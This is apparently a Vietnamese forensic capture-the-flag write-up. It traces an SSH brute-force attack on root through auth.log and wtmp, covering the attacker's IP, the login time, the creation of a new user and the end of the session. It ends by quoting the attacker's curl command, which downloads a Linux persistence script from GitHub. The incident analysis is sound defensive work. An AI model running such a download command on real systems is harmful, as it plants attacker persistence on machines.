
ta sẽ vào file auth.log để đọc, để ý những dòng bị fail password liên tục thì chính là đang bruteforce cùng với đó là biết được IP của hacker

<img width="1727" height="412" alt="image" src="https://github.com/user-attachments/assets/57084d67-3692-4675-9f57-b2c55dc166af" />

khi mà đăng nhập thành công nó sẽ thông báo, ở hình dưới đây chính là root được brute force mật khẩu thành công

<img width="1712" height="329" alt="image" src="https://github.com/user-attachments/assets/abca2a64-1aa8-4c8b-9eda-ae432ca364a5" />

bài này người ta cho mình sẵn script .py để đọc file: `python .\utmp.py wtmp`

<img width="1849" height="906" alt="image" src="https://github.com/user-attachments/assets/eabe49eb-9f38-4e53-855b-31f32740e092" />

xem dòng `"2024/03/05 22:32:45"` thì ta có thể đoán được là hacker vào máy thành công nhưng xét về giờ giấc thì hơi khác so với file auth.log, nên ta phải kiểm tra lại và chú ý dòng `Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.`, có vẻ múi giờ khá bị xáo trộn nên có thể thêm bớt giây

đọc tiếp log thì biết rằng session mới được tạo và hacker đã tạo thêm 1 user mới

<img width="2132" height="436" alt="image" src="https://github.com/user-attachments/assets/15df27a1-68df-4d48-bac7-7285180c554d" />

search gu gồ cho biết loại tấn công được định danh bằng id nào

<img width="851" height="77" alt="image" src="https://github.com/user-attachments/assets/58b85328-58e0-4ab7-880d-0013c06cb0ff" />

biết được ssh end thông qua `Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184`

và dùng quyền root để tải file về máy `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`










